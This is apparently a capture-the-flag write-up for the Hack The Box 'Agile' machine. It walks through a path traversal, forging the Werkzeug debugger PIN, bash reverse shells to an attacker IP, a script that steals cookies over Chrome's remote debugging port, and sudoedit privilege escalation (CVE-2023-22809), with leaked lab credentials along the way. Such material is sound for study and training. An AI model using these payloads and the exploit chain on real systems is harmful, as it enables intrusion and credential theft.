# Agile

```bash
TARGET=10.10.11.203
```

```bash
$ sudo nmap -v -sC -sV $TARGET 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-23 19:35 PDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
...
Scanning 10.10.11.203 [4 ports]
...
Scanning 10.10.11.203 [1000 ports]
Discovered open port 22/tcp on 10.10.11.203
Discovered open port 80/tcp on 10.10.11.203
...
Nmap scan report for 10.10.11.203
Host is up (0.096s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f4:bc:ee:21:d7:1f:1a:a2:65:72:21:2d:5b:a6:f7:00 (ECDSA)
|_  256 65:c1:48:0d:88:cb:b9:75:a0:2c:a5:e6:37:7e:51:06 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://superpass.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 19:36
Completed NSE at 19:36, 0.00s elapsed
Initiating NSE at 19:36
Completed NSE at 19:36, 0.00s elapsed
Initiating NSE at 19:36
Completed NSE at 19:36, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.50 seconds
           Raw packets sent: 1156 (50.840KB) | Rcvd: 1001 (40.048KB)
```

```bash
$ curl -I $TARGET          
HTTP/1.1 301 Moved Permanently
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 24 Jun 2024 02:36:19 GMT
Content-Type: text/html
Content-Length: 178
Connection: keep-alive
Location: http://superpass.htb
```

```bash
$ cat /etc/hosts | grep $TARGET 
10.10.11.203    superpass.htb
```

![Home](images/port_80_home.png)

![Login/Register](images/port_80_login_page.png)

After registering for a new user and login, we can create and export passwords

![Vaults](images/port_80_vaults.png)

![Burp Export](images/port_80_burp_export.png)

![Burp LFI](images/port_80_LFI.png)

![Burp LFI](images/port_80_LFI_passwd.png)

```bash
$ curl --path-as-is -i -s -k -X $'GET' \
    -H $'Host: superpass.htb' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Connection: keep-alive' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'session=.eJwlTsuKwzAM_BWjc1lsx5KjfEXvSymWIzeB9EGcnkr_fQU7l2EeDPOBa9tKX7TD9PsBdxjBXXsvN4UTnDctXd32vLn14Y6nK7Va6I5l7e5lnR-4fC8nG9m1LzAd-1tNrTNMIKWSDqnGlBoHL4hlDMJVm2LlKj60gRPnEcViHEk9a_YzKmaDCHKMKi0POYxEIsTszebISRKlRIg-I7FQ9LlFLpKCD6RkuuFs96_vrvv_G4bvH7XuRMs.Znjerw.c8mYkBgRvnDmdDZ7z1SUhR3GYRw; remember_token=9|fd28b85a6634750a15973d2744a9332c5b90df81d7e0ec07e607f6ab830331b3deb216d40783f8786553968235f9bd88e68864135e7e6743ba4552f0ee8cc593' \
    $'http://superpass.htb/download?fn=../etc/passwd' | grep 'sh$'

root:x:0:0:root:/root:/bin/bash
corum:x:1000:1000:corum:/home/corum:/bin/bash
runner:x:1001:1001::/app/app-testing/:/bin/sh
edwards:x:1002:1002::/home/edwards:/bin/bash
dev_admin:x:1003:1003::/home/dev_admin:/bin/bash
```

The app is constantly failing and seems to be redeploying. We see errors like the following.

![Error](images/port_80_mysql_error.png)

Also we can force the debug page make a request as the following

```bash
http://superpass.htb/download?fn=dsadsa
```

This is `Werkzeug` debugger and if we click on the stacks we get a prompt to provide a PIN.

![Debugger PIN](images/port_80_debug_pin.png)

[Hacktricks - Werkzeug](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug#werkzeug-console-pin-exploit) link has a nice explanation on how to hack this PIN. There is also this [video from 0xdf](https://www.youtube.com/watch?v=6BWaea0nfE0) that gives an nice explanation about how the app(debug) generates this PIN.

There is a script on the page to help generate the PIN, but we need to change a few things.

```python
...
probably_public_bits = [
    'web3_user',  # username
    'flask.app',  # modname
    'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.5/dist-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
    '279275995014060',  # str(uuid.getnode()),  /sys/class/net/ens33/address
    'd4e6cb65d59544f3331ea0425dc555a1'  # get_machine_id(), /etc/machine-id
]
...
```

`/proc/self/environ` = `www-data`

![username](images/port_80_debug_pin_username.png)

```python
...
probably_public_bits = [
    'www-data',  # username
    'flask.app',  # modname
    'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.5/dist-packages/flask/app.py'  # getattr(mod, '__file__', None),
]
...
```

Back on the error msg we can get the other values for the `probably_public_bits`

![app name](images/port_80_debug_pin_appname.png)

`/app/venv/lib/python3.10/site-packages/flask/app.py` and `wsgi_app`

```python
...
probably_public_bits = [
    'www-data',  # username
    'flask.app',  # modname
    'wsgi_app',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/app/venv/lib/python3.10/site-packages/flask/app.py'  # getattr(mod, '__file__', None),
]
...
```

We still need info for the `private_bits` part of the code.

```python
...
private_bits = [
    '279275995014060',  # str(uuid.getnode()),  /sys/class/net/ens33/address
    'd4e6cb65d59544f3331ea0425dc555a1'  # get_machine_id(), /etc/machine-id
]
...
```

Lets simplify our `curl` to be able to reuse it. We need to get `/proc/net/arp` to see the nic devices on the machine, and `/sys/class/net/[device]/address` of the nic to be able to get the MAC Address.

```bash
$ cookie="session=.eJwlTsuKwzAM_BWjc1lsx5KjfEXvSymWIzeB9EGcnkr_fQU7l2EeDPOBa9tKX7TD9PsBdxjBXXsvN4UTnDctXd32vLn14Y6nK7Va6I5l7e5lnR-4fC8nG9m1LzAd-1tNrTNMIKWSDqnGlBoHL4hlDMJVm2LlKj60gRPnEcViHEk9a_YzKmaDCHKMKi0POYxEIsTszebISRKlRIg-I7FQ9LlFLpKCD6RkuuFs96_vrvv_G4bvH7XuRMs.Znjerw.c8mYkBgRvnDmdDZ7z1SUhR3GYRw; remember_token=9|fd28b85a6634750a15973d2744a9332c5b90df81d7e0ec07e607f6ab830331b3deb216d40783f8786553968235f9bd88e68864135e7e6743ba4552f0ee8cc593"

$ curl -s --path-as-is -b $cookie http://superpass.htb/download?fn=../proc/net/arp 
IP address       HW type     Flags       HW address            Mask     Device
10.10.10.2       0x1         0x2         00:50:56:b9:ad:f7     *        eth0

$ curl -s --path-as-is -b $cookie http://superpass.htb/download?fn=../sys/class/net/eth0/address
00:50:56:b0:13:52
```

Lets convert the MAC address using python

```bash
$ python3
Python 3.11.8 (main, Feb  7 2024, 21:52:08) [GCC 13.2.0] on linux
...
>>> int("00:50:56:b0:13:52".replace(':',''), 16)
345051763538
```

The next item is a combination of a couple files. First, I need `/etc/machine-id`

```bash
$ curl -s --path-as-is -b $cookie http://superpass.htb/download?fn=../etc/machine-id
ed5b159560f54721827644bc9b220d00
```

And the first line of `/proc/self/cgroup`, from the last “/” to the end

```bash
$ curl -s --path-as-is -b $cookie http://superpass.htb/download?fn=../proc/self/cgroup
0::/system.slice/superpass.service
```

In this case `superpass.service`

Back to  `private_bits`, we will have the following.

```python
...
private_bits = [
    '345051763538',  # str(uuid.getnode()),  /sys/class/net/ens33/address
    'ed5b159560f54721827644bc9b220d00superpass.service'  # get_machine_id(), /etc/machine-id
]
...
```

Now we can run the script we got from HackTricks.

```bash
$ python3 genpin.py 
540-279-291
```

![Good PIN](images/port_80_debug_pin_good.png)

![Debug Console](images/port_80_debug_py_console.png)

![Shell](images/port_80_shell.png)

```bash
$ rlwrap -cAr nc -nlvp 9001
listening on [any] 9001 ...
```

```bash
import os; os.system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.3/9001 0>&1'")
```

![Reverse Shell](images/port_80_revshell.png)

```bash
$ rlwrap -cAr nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.11.203] 33584
bash: cannot set terminal process group (1073): Inappropriate ioctl for device
bash: no job control in this shell
(venv) www-data@agile:/app/app$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
export TERM=xterm
Ctrl z
stty raw -echo; fg
```

```bash
(venv) www-data@agile:/app/app$ cat superpass/app.py | grep config
...
def load_config():
    config_path = os.getenv("$")
    with open(config_path, 'r') as f:
            app.config[k] = v
...
```

```bash
(venv) www-data@agile:/app/app$ env
env
SERVER_SOFTWARE=gunicorn/20.1.0
PWD=/app/app
LOGNAME=www-data
SYSTEMD_EXEC_PID=1073
HOME=/var/www
LANG=C.UTF-8
VIRTUAL_ENV=/app/venv
CONFIG_PATH=/app/config_prod.json
INVOCATION_ID=24b6e873b7104fc89642217d2e678fbd
TERM=xterm
USER=www-data
SHLVL=3
VIRTUAL_ENV_PROMPT=(venv) 
PS1=(venv) ${debian_chroot:+($debian_chroot)}\u@\h:\w\$ 
JOURNAL_STREAM=8:32583
PATH=/app/venv/bin:/app/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
_=/usr/bin/env
```

```bash
venv) www-data@agile:/app/app$ cat /app/config_prod.json
cat /app/config_prod.json
{"SQL_URI": "mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass"}
```

| Username | Password | Target |
| -- | -- | -- |
| superpassuser | dSA6l7q*yIVs$39Ml6ywvgK | Mysql |

```bash
(venv) www-data@agile:/app/app$ mmysql -u superpassuser -p
Enter password: dSA6l7q*yIVs$39Ml6ywvgK

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 188
Server version: 8.0.32-0ubuntu0.22.04.2 (Ubuntu)
...
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```

```bash
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| performance_schema |
| superpass          |
+--------------------+

mysql> use superpass;
Database changed

mysql> show tables;
+---------------------+
| Tables_in_superpass |
+---------------------+
| passwords           |
| users               |
+---------------------+
2 rows in set (0.00 sec)

mysql> SELECT url, username, password FROM passwords;
+----------------+----------+----------------------+
| url            | username | password             |
+----------------+----------+----------------------+
| hackthebox.com | 0xdf     | 762b430d32eea2f12970 |
| mgoblog.com    | 0xdf     | 5b133f7a6a1c180646cb |
| mgoblog        | corum    | 47ed1e73c955de230a1d |
| ticketmaster   | corum    | 9799588839ed0f98c211 |
| agile          | corum    | 5db7caa1d13cc37c9fc2 |
+----------------+----------+----------------------+
5 rows in set (0.00 sec)
```

```bash
$ netexec ssh $TARGET -u corum -p 5db7caa1d13cc37c9fc2             
SSH         10.10.11.203    22     10.10.11.203     [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1
SSH         10.10.11.203    22     10.10.11.203     [+] corum:5db7caa1d13cc37c9fc2  (non root) Linux - Shell access!
```

| Username | Password | Target |
| -- | -- | -- |
| superpassuser | dSA6l7q*yIVs$39Ml6ywvgK | Mysql |
| corum | 5db7caa1d13cc37c9fc2 | ssh |

```bash
$ sshpass -p '5db7caa1d13cc37c9fc2' ssh corum@$TARGET
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-60-generic x86_64)
...
corum@agile:~$ id
uid=1000(corum) gid=1000(corum) groups=1000(corum)
```

```bash
corum@agile:~$ ls -lha  /etc/nginx/sites-enabled/
total 8.0K
drwxr-xr-x 2 root root 4.0K Jan 25  2023 .
drwxr-xr-x 8 root root 4.0K Feb  8  2023 ..
lrwxrwxrwx 1 root root   42 Jan 25  2023 agile.htb.nginx -> /etc/nginx/sites-available/agile.htb.nginx
lrwxrwxrwx 1 root root   41 Jan 25  2023 redirect.nginx -> /etc/nginx/sites-available/redirect.nginx
lrwxrwxrwx 1 root root   47 Jan 25  2023 superpass-test.nginx -> /etc/nginx/sites-available/superpass-test.nginx
lrwxrwxrwx 1 root root   42 Jan 25  2023 superpass.nginx -> /etc/nginx/sites-available/superpass.nginx
```

Nginx seems to be listing port 80 on localhost for `test.superpass.htb` redirecting to 5555.

```bash
corum@agile:~$ cat /etc/nginx/sites-available/superpass-test.nginx
server {
    listen 127.0.0.1:80;
    server_name test.superpass.htb;

    location /static {
        alias /app/app-testing/superpass/static;
        expires 365d;
    }
    location / {
        include uwsgi_params;
        proxy_pass http://127.0.0.1:5555;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-Protocol $scheme;
    }
}
```

```bash
corum@agile:~$ ss -lntp | grep -e ':80' -e ':5555'
LISTEN 0      511          0.0.0.0:80         0.0.0.0:*          
LISTEN 0      2048       127.0.0.1:5555       0.0.0.0:*
```

```bash
corum@agile:~$ ls -lha /app/
total 36K
drwxr-xr-x  6 root      root      4.0K Mar  8  2023 .
drwxr-xr-x 20 root      root      4.0K Feb 20  2023 ..
drwxr-xr-x  3 root      root      4.0K Jan 23  2023 .pytest_cache
drwxr-xr-x  5 corum     runner    4.0K Feb  8  2023 app
drwxr-xr-x  9 runner    runner    4.0K Feb  8  2023 app-testing
-r--r-----  1 dev_admin www-data    88 Jan 25  2023 config_prod.json
-r--r-----  1 dev_admin runner      99 Jan 25  2023 config_test.json
-rwxr-xr-x  1 root      runner     557 Jun 24 18:33 test_and_update.sh
drwxrwxr-x  5 root      dev_admin 4.0K Feb  8  2023 venv
```

```bash
corum@agile:~$ cat /app/test_and_update.sh 
#!/bin/bash

# update prod with latest from testing constantly assuming tests are passing

echo "Starting test_and_update"
date

# if already running, exit
ps auxww | grep -v "grep" | grep -q "pytest" && exit

echo "Not already running. Starting..."

# start in dev folder
cd /app/app-testing

# system-wide source doesn't seem to happen in cron jobs
source /app/venv/bin/activate

# run tests, exit if failure
pytest -x 2>&1 >/dev/null || exit

# tests good, update prod (flask debug mode will load it instantly)
cp -r superpass /app/app/
echo "Complete!"
```

`pytest` seems to be running tests on the `app-testing`.

```bash
corum@agile:~$ ls -lha /app/app-testing/tests/functional/
total 20K
drwxr-xr-x 3 runner    runner 4.0K Feb  7  2023 .
drwxr-xr-x 3 runner    runner 4.0K Feb  6  2023 ..
drwxrwxr-x 2 runner    runner 4.0K Jun 25 01:33 __pycache__
-rw-r----- 1 dev_admin runner   34 Jun 25 01:36 creds.txt
-rw-r--r-- 1 runner    runner 2.7K Jun 25 01:36 test_site_interactively.py
```

We don't have access to the `creds.txt` file. This file may contain the creds to the tests.

```bash
corum@agile:~$ cat /app/app-testing/tests/functional/creds.txt 
cat: /app/app-testing/tests/functional/creds.txt: Permission denied
```

The `test_site_interactively.py` seems to be reading the `creds.txt`, and using the creds on `test.superpass.htb`. We saw this site back on `/etc/nginx/sites-available/superpass-test.nginx`. `Selenium` seems to be a chrome extension or something that helps with the interactive tests.

```bash
corum@agile:~$ cat /app/app-testing/tests/functional/test_site_interactively.py 
import os
import pytest
import time
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait

with open('/app/app-testing/tests/functional/creds.txt', 'r') as f:
    username, password = f.read().strip().split(':')

@pytest.fixture(scope="session")
def driver():
    options = Options()
    #options.add_argument("--no-sandbox")
    options.add_argument("--window-size=1420,1080")
    options.add_argument("--headless")
    options.add_argument("--remote-debugging-port=41829")
    options.add_argument('--disable-gpu')
    options.add_argument('--crash-dumps-dir=/tmp')
    driver = webdriver.Chrome(options=options)
    yield driver
    driver.close()

def test_login(driver):
    print("starting test_login")
    driver.get('http://test.superpass.htb/account/login')
    time.sleep(1)
    username_input = driver.find_element(By.NAME, "username")
    username_input.send_keys(username)
    password_input = driver.find_element(By.NAME, "password")
    password_input.send_keys(password)
    driver.find_element(By.NAME, "submit").click()
    time.sleep(3)
    title = driver.find_element(By.TAG_NAME, "h1")
    assert title.text == "Welcome to your vault"
...
```

We know `test.superpass.htb` is responding on port 80, redirecting to 5555. And it seems that `selenium` (when it is running) is responding on port 41829, but only in localhost.

```bash
corum@agile:~$ ss -lntp | grep -e ':80' -e ':5555' -e ':41829'
LISTEN 0      10         127.0.0.1:41829      0.0.0.0:*          
LISTEN 0      511          0.0.0.0:80         0.0.0.0:*          
LISTEN 0      2048       127.0.0.1:5555       0.0.0.0:*
```

It seems user `runner` is the one running that `selenium` (`/usr/bin/google-chrome`) thing. And the port 41829 is for remote debugging `--remote-debugging-port=41829`

```bash
corum@agile:~$ ps -ef | grep 41829
runner     19848   19842  0 02:07 ?        00:00:00 /usr/bin/google-chrome --allow-pre-commit-input --crash-dumps-dir=/tmp --disable-background-networking --disable-client-side-phishing-detection --disable-default-apps --disable-gpu --disable-hang-monitor --disable-popup-blocking --disable-prompt-on-repost --disable-sync --enable-automation --enable-blink-features=ShadowDOMV0 --enable-logging --headless --log-level=0 --no-first-run --no-service-autorun --password-store=basic --remote-debugging-port=41829 --test-type=webdriver --use-mock-keychain --user-data-dir=/tmp/.com.google.Chrome.pE7gz1 --window-size=1420,1080 data:,
runner     19911   19863  0 02:07 ?        00:00:00 /opt/google/chrome/chrome --type=renderer --headless --crashpad-handler-pid=19855 --lang=en-US --enable-automation --enable-logging --log-level=0 --remote-debugging-port=41829 --test-type=webdriver --allow-pre-commit-input --ozone-platform=headless --disable-gpu-compositing --enable-blink-features=ShadowDOMV0 --lang=en-US --num-raster-threads=1 --renderer-client-id=5 --time-ticks-at-unix-epoch=-1719243772591160 --launch-time-ticks=37449894611 --shared-files=v8_context_snapshot_data:100 --field-trial-handle=0,i,15403983940130417203,7773762045654099854,131072 --disable-features=PaintHolding
```

Let's try to redirect port 5555 or our machine to the target port 5555 and see if we can access the test website.

```bash
sshpass -p '5db7caa1d13cc37c9fc2' ssh -L 5555:127.0.0.1:5555 corum@$TARGET
```

![Test site](images/port_5555_test_site.png)

We can access it, but it seems the neither the path traversal bug, not the debug mode are working here.

![path traversal](images/port_5555_test_lfi.png)
![debug disabled](images/port_5555_test_debug.png)

It means we need another way in.

Maybe using the chrome remote debugging. If we use `curl` and hit the debugger port + `/json`, we get info about a WebSocket.

```bash
corum@agile:~$ curl -s localhost:41829/json
[ {
   "description": "",
   "devtoolsFrontendUrl": "/devtools/inspector.html?ws=localhost:41829/devtools/page/4E56C3D8518BD3670E01C746273ACFE0",
   "id": "4E56C3D8518BD3670E01C746273ACFE0",
   "title": "SuperPassword 🦸",
   "type": "page",
   "url": "http://test.superpass.htb/",
   "webSocketDebuggerUrl": "ws://localhost:41829/devtools/page/4E56C3D8518BD3670E01C746273ACFE0"
} ]
```

We could try to reach the WebSocket via Python, but the websocket module is not installed. We could try PHP, but it is also not installed.

```bash
corum@agile:~$ python3
Python 3.10.6 (main, Nov 14 2022, 16:10:14) [GCC 11.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import websocket
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
ModuleNotFoundError: No module named 'websocket'
```

Lets, one more time, redirect local ports to the target. This time we can do for the test website on port 5555 and the chrome debugger on 41829.

```bash
sshpass -p '5db7caa1d13cc37c9fc2' ssh -L 5555:127.0.0.1:5555 -L 41829:127.0.0.1:41829 corum@$TARGET
```

We can now access the debugger locally now.

```bash
$ curl -s localhost:41829/json
[ {
   "description": "",
   "devtoolsFrontendUrl": "/devtools/inspector.html?ws=localhost:41829/devtools/page/25239804303EF8BD341CE3E154870CB5",
   "id": "25239804303EF8BD341CE3E154870CB5",
   "title": "SuperPassword 🦸",
   "type": "page",
   "url": "http://test.superpass.htb/",
   "webSocketDebuggerUrl": "ws://localhost:41829/devtools/page/25239804303EF8BD341CE3E154870CB5"
} ]
```

Now we have 2 options. We can run a script to connect to the debugger on the WebSocket and request all the cookies, or we can set our Chromium to inspect that port and investigate over there. Lets try both.

The following script will do the trick to us. Idea from [GitHub - cookie_crimes](https://github.com/defaultnamehere/cookie_crimes).

```python
import json
import requests
import websocket

debug_json_url = "http://localhost:41829/json"

response = requests.get(debug_json_url)
websocket_url = response.json()[0].get("webSocketDebuggerUrl")

GET_ALL_COOKIES_REQUEST = json.dumps({"id": 1, "method": "Network.getAllCookies"})
ws = websocket.create_connection(websocket_url)
ws.send(GET_ALL_COOKIES_REQUEST)
result = ws.recv()
ws.close()

# Parse out the actual cookie object from the debugging protocol object.
response = json.loads(result)
cookies = response["result"]["cookies"]

print(json.dumps(cookies,indent=4, separators=(',', ': '), sort_keys=True))
```

```bash
$ python3 ws_get_cookies.py
[
    {
        "domain": "test.superpass.htb",
        "expires": 1750821783.888018,
        "httpOnly": true,
        "name": "remember_token",
        "path": "/",
        "priority": "Medium",
        "sameParty": false,
        "secure": false,
        "session": false,
        "size": 144,
        "sourcePort": 80,
        "sourceScheme": "NonSecure",
        "value": "1|f3b482f5844bd6a939e71ab49e1544c5599e2a648b5d959667be417bfbd16f1d7c2eb481193d45d830932519e11e87d2c702dbbf6f1205e87bbba4c67784eb6f"
    },
    {
        "domain": "test.superpass.htb",
        "expires": -1,
        "httpOnly": true,
        "name": "session",
        "path": "/",
        "priority": "Medium",
        "sameParty": false,
        "secure": false,
        "session": true,
        "size": 215,
        "sourcePort": 80,
        "sourceScheme": "NonSecure",
        "value": ".eJwlzjkOwjAQAMC_uKbYy2snn0HeS9AmpEL8HSTmBfNu9zryfLT9dVx5a_dntL1x6FxEI2cX1lATrF6KSgYjJDcv24LSRQu2bqQwPXGymkPMEIMAjpDRO6DjcqqZqoOjWBxRQYEsmXHgxCUhsNzTRhh2kvaLXGce_w22zxef3y7n.Zno4Fw.5MrFrGnjvsk2Ccxm-6nJFyMsXqQ"
    }
]
```

Direct on Chromium - `chrome://inspect`

![alt text](images/chromium_inspect.png)
![alt text](images/chromium_inspect_add.png)
![alt text](images/chromium_inspect_superpwd.png)

We could now, get cookies and/or go direct to the vault and get some passwords.

![alt text](images/chromium_inspect_superpwd_cookies.png)
![alt text](images/chromium_inspect_superpwd_vault.png)

This seems to be a good one - `edwards` - `d07867c6267dcb5df0af`

```bash
$ netexec ssh $TARGET -u edwards -p d07867c6267dcb5df0af
SSH         10.10.11.203    22     10.10.11.203     [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1
SSH         10.10.11.203    22     10.10.11.203     [+] edwards:d07867c6267dcb5df0af  (non root) Linux - Shell access!
```

| Username | Password | Target |
| -- | -- | -- |
| superpassuser | dSA6l7q*yIVs$39Ml6ywvgK | Mysql |
| corum | 5db7caa1d13cc37c9fc2 | ssh |
| edwards | d07867c6267dcb5df0af | ssh |

```bash
$ sshpass -p 'd07867c6267dcb5df0af' ssh edwards@$TARGET
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-60-generic x86_64)
...
Last login: Thu Mar  2 10:28:51 2023 from 10.10.14.23
edwards@agile:~$ id
uid=1002(edwards) gid=1002(edwards) groups=1002(edwards)
```

It seems we have a few extra permissions with `sudoedit` here.

```bash
edwards@agile:~$ sudo -l
[sudo] password for edwards: 
Matching Defaults entries for edwards on agile:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User edwards may run the following commands on agile:
    (dev_admin : dev_admin) sudoedit /app/config_test.json
    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt
```

`sudoedit` will allow us to read/write these specific files as `dev_admin`. The env `EDITOR` before the command allows us change the editor used to open the file. If we want only to read the file we can change it to `cat`.

```bash
edwards@agile:~$ ls -lha /app/config_test.json /app/app-testing/tests/functional/creds.txt
-r--r----- 1 dev_admin runner 99 Jan 25  2023 /app/config_test.json
-rw-r----- 1 dev_admin runner 34 Jun 25 06:18 /app/app-testing/tests/functional/creds.txt
```

```bash
edwards@agile:~$ EDITOR="cat" sudoedit -u dev_admin /app/config_test.json
[sudo] password for edwards: 
{
    "SQL_URI": "mysql+pymysql://superpasstester:VUO8A2c2#3FnLq3*a9DX1U@localhost/superpasstest"
}sudoedit: /app/config_test.json unchanged
```

```bash
edwards@agile:~$ EDITOR="cat" sudoedit -u dev_admin /app/app-testing/tests/functional/creds.txt
edwards:1d7ffjwrx#$d6qn!9nndqgde4
sudoedit: /app/app-testing/tests/functional/creds.txt unchanged
```

## CVE-2023-22809 - sudo 1.8.0 to 1.9.12p1 - Privilege Escalation

It seems there is a bug on the `sudoedit` version we are have available.

```bash
edwards@agile:~$ sudoedit -V
Sudo version 1.9.9
Sudoers policy plugin version 1.9.9
Sudoers file grammar version 48
Sudoers I/O plugin version 1.9.9
Sudoers audit plugin version 1.9.9
```

From [Exploit DB CVE-2023-22809](https://www.exploit-db.com/exploits/51217), it seems we can abuse the `EDITOR` variable adding other files after the name of editor we want to use.

Example:

```bash
EDITOR="vim -- /etc/sudoers" $EXPLOITABLE
```

Lets find useful files that we could edit.

```bash
edwards@agile:~$ find / -user dev_admin 2>/dev/null
/home/dev_admin
/app/app-testing/tests/functional/creds.txt
/app/config_test.json
/app/config_prod.json
```

```bash
edwards@agile:~$ find / -group dev_admin 2>/dev/null
/home/dev_admin
/app/venv
/app/venv/bin
/app/venv/bin/activate
/app/venv/bin/Activate.ps1
/app/venv/bin/activate.fish
/app/venv/bin/activate.csh
```

The `/app/venv/bin/activate` is on the script we saw before.

```bash
corum@agile:~$ cat /app/test_and_update.sh 
...
# system-wide source doesn't seem to happen in cron jobs
source /app/venv/bin/activate
...
```

```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.3/9001 0>&1'
```

![sudoedit](images/sudoedit_nano.png)

```bash
$ rlwrap -cAr nc -nlvp 9001
listening on [any] 9001 ...
```

After a few seconds...

```bash
$ rlwrap -cAr nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.11.203] 39212
bash: cannot set terminal process group (28376): Inappropriate ioctl for device
bash: no job control in this shell
root@agile:~# id
id
uid=0(root) gid=0(root) groups=0(root)
```
